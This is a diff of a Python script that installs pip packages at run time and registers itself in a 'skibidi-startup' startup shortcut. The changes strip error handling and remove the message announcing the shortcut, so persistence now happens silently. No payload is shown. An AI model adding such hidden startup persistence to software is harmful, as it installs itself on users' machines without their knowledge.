@@ -16,20 +16,13 @@ required_package = [
 ]
 
 def install_package():
-    try:
-        for package in required_package:
-            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
-        print("All packages installed successfully!")
-    except subprocess.CalledProcessError as e:
-        print(f"Failed to install {e.cmd}. Error: {e}")
+    for package in required_package:
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
+
 
 def install_packages():
-    try:
-        for package in required_packages:
-            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
-        print("All packages installed successfully!")
-    except subprocess.CalledProcessError as e:
-        print(f"Failed to install {e.cmd}. Error: {e}")
+    for package in required_packages:
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
 
 install_package()
 install_packages()
@@ -76,8 +69,6 @@ def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'sta
     shortcut.WorkingDirectory = str(Path(script_path).parent)
     shortcut.IconLocation = str(script_path)
     shortcut.save()
-
-    print(f"Shortcut created at {shortcut_path}")
 
 add_to_startup()
 
